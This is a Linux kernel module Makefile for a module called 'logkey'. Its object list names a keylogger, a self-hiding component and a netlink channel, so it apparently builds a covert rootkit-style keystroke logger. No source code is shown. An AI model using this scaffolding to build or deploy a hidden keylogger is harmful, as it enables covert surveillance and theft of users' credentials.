obj-m := logkey.o

logkey-objs := \
	src/device.o \
	src/hide_module.o \
	src/keylogger.o \
	src/keymap.o \
	src/netlink_comm.o \
	src/ringbuf.o \
	src/main.o

ccflags-y := -I$(PWD)/include

KDIR := /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
